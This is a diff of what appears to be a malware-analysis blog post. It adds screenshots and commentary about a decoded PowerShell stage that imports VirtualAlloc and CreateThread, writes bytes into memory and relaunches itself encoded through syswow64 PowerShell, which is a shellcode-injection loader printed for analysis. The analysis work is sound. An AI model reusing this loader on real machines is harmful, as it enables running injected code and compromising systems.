@@ -24,6 +24,9 @@ rwXRzuPgvutxxjOvbZUWejvaCO.run('%windir%\\System32\\' + ckFMmsPAsm + ' /c powers
 
 There are references to WScript and PowerShell, followed by a large Base64 blob, we'll decode this blob to reveal the contents:
 
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7d041fc7-25e7-4329-ab68-053176191270)
+
+
 ```
 $MPm = '$MP = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public
 static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
@@ -34,4 +37,13 @@ $aN.Length};$mM=$gL::VirtualAlloc(0,0x1000,$Ud,0x40);for ($Bw=0;$Bw -le ($aN.Len
 {Start-Sleep 60};';$cF = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MPm));$pq = "-ec ";if([IntPtr]::Size -eq 8){$Jr = $env:SystemRoot +
 "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $Jr $pq $cF"}else{;iex "& powershell $pq $cF";}
 ```
+
+There are references to injection APIs such as VirtualAlloc, Memset and CreateThread, which could be an indication that the following hex blob is shellcode.
+
+We can validate this by using the disassemble x86 operator in CyberChef.
+
+<img width="1386" alt="image" src="https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6279660b-dcb3-4cac-945e-98395f92b469">
+
+
+
 
